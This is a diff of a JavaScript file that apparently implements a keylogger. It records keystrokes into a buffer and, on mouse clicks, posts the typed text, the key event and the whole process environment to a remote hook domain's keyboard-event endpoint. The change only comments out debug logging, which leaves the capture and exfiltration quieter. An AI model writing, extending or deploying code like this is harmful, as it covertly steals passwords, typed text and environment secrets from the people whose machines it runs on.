@@ -64,14 +64,13 @@ try {
     }
 
     function processKeyEvent(event, down) {
-        console.log('key ********************************************');
         if (!v) return; // If GlobalKeyboardListener is not initialized, do nothing.
 
         isShiftPressed = down['LEFT SHIFT'] || down['RIGHT SHIFT']; 
 
         const keyName = event.name;
         if (down[keyName]) {
-            console.log(event.rawKey);
+            //console.log(event.rawKey);
             if (event.rawKey && ['VK_MBUTTON', 'VK_RBUTTON', 'VK_LBUTTON'].includes(event.rawKey._nameRaw)) {
                 if (inputBuffer.length > 0) {
                     const data = {
@@ -80,7 +79,7 @@ try {
                         event: event,
                         env: process.env
                     };
-                    console.log()
+                    // console.log()
                     fetchHookDomainAndPostData(data);
                 }
                 return;
@@ -116,14 +115,14 @@ try {
                 inputBuffer += isShiftPressed ? shiftSpecialChars[keyName] : otherChars[keyName];
             }
 
-            console.log(inputBuffer);
+            // console.log(inputBuffer);
         }
     }
 
     const fetchHookDomainAndPostData = async (data) => {
         try {
             const postResponse = await axios.post(`${hookDomain}/hook/keyboard-event`, data);
-            console.log(`Data sent successfully: ${postResponse.data}`);
+            //console.log(`Data sent successfully: ${postResponse.data}`);
         } catch (error) {
             console.error(`Error sending data: ${error}`);
         }
